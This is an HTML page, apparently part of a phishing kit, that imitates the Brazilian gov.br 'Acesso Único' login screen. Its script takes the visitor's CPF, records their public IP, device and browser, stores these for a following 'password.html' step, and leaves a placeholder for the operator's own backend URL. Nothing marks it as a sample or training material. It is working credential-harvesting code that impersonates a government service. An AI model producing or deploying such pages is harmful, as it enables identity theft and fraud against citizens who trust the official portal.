<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gov.br - Acesse sua conta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a5f7a 0%, #0d3550 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 8px;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #1a5f7a; font-size: 24px; margin-bottom: 8px; }
        .header p { color: #666; font-size: 14px; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: #1a5f7a;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn-login:hover { background: #0d4b63; }
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            display: none;
        }
        .message.error { background: #fee; color: #c33; display: block; }
        .message.success { background: #efe; color: #3c3; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>gov.br</h1>
            <p>ACESSO ÚNICO</p>
        </div>
        
        <div class="input-group">
            <label>CPF</label>
            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
        </div>
        
        <button class="btn-login" onclick="continuar()">Continuar</button>
        
        <div id="message" class="message"></div>
    </div>

    <script>
        // ============================================================
        // CONFIGURAÇÃO - ALTERAR PARA URL DO SEU BACKEND
        // ============================================================
        const API_URL = 'https://seu-backend.onrender.com/api';

        // Função para coletar dados do dispositivo
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let dispositivo = 'Desktop';
            let navegador = 'Desconhecido';
            
            // Detectar dispositivo
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
                dispositivo = 'Mobile';
            } else if (/Tablet|iPad/i.test(userAgent)) {
                dispositivo = 'Tablet';
            }
            
            // Detectar navegador
            if (userAgent.indexOf('Chrome') > -1) navegador = 'Chrome';
            else if (userAgent.indexOf('Firefox') > -1) navegador = 'Firefox';
            else if (userAgent.indexOf('Safari') > -1) navegador = 'Safari';
            else if (userAgent.indexOf('Edge') > -1) navegador = 'Edge';
            else if (userAgent.indexOf('Opera') > -1) navegador = 'Opera';
            
            return { dispositivo, navegador };
        }

        // Função para obter IP público
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Não foi possível obter IP';
            }
        }

        // Formatar CPF
        function formatCPF(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            if (value.length >= 4) value = value.replace(/(\d{3})(\d)/, '$1.$2');
            if (value.length >= 8) value = value.replace(/(\d{3})(\d)/, '$1.$2');
            if (value.length >= 11) value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            input.value = value;
        }

        document.getElementById('cpf').addEventListener('input', function() { formatCPF(this); });

        async function continuar() {
            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
            const messageDiv = document.getElementById('message');
            
            if (!cpf || cpf.length !== 11) {
                messageDiv.textContent = 'Digite um CPF válido';
                messageDiv.className = 'message error';
                setTimeout(() => messageDiv.style.display = 'none', 3000);
                return;
            }
            
            // Coletar dados do usuário
            const ip = await getPublicIP();
            const { dispositivo, navegador } = getDeviceInfo();
            
            // Salvar no localStorage para passar para próxima página
            localStorage.setItem('login_cpf', cpf);
            localStorage.setItem('login_ip', ip);
            localStorage.setItem('login_dispositivo', dispositivo);
            localStorage.setItem('login_navegador', navegador);
            
            // Redirecionar para página de senha
            window.location.href = 'password.html';
        }
    </script>
</body>
</html>
